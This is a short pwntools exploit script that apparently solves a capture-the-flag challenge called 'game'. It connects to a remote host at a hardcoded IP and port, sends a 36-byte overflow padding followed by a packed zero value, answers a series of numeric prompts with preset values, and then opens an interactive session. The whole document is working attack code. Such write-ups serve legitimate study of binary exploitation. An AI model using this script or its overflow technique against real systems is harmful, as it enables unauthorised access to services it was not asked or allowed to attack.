from pwn import * 
context.log_level = "debug"
context.terminal = ['tmux','sp','-h']

# p = process("./game")
p = remote("39.96.88.40",7040)

payload = 'a'*36
payload += p64(0)
num = [55,15,82,1,0x62,0x44,0x43,0xf,0x56,0x3]



p.recvuntil("is :")
p.send(payload)

for i in num:
    p.recvuntil(":")
    p.sendline(str(i))

# gdb.attach(p,"b *$rebase(0xAF0)")



p.interactive()